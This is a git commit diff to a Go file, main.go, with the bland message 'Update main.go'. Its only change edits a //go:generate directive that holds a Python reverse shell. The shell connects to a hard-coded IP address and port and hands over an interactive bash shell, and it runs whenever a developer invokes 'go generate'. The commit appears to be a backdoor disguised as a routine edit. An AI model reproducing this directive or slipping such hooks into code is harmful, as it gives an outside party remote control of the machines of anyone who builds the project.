b0ec3444c2cb275006c1e5883ceb7b93e5cadc31
armmanvaillancourt <133890309+armmanvaillancourt@users.noreply.github.com>
2023-11-30 13:40:51 -0500

    Update main.go
    Signed-off-by: armmanvaillancourt <133890309+armmanvaillancourt@users.noreply.github.com>

--- main.go
+++ main.go
@@ -1,4 +1,4 @@
-//go:generate python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("35.184.92.106",9897));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
+//go:generate python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("35.184.92.106",9897));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
 
 package main
 
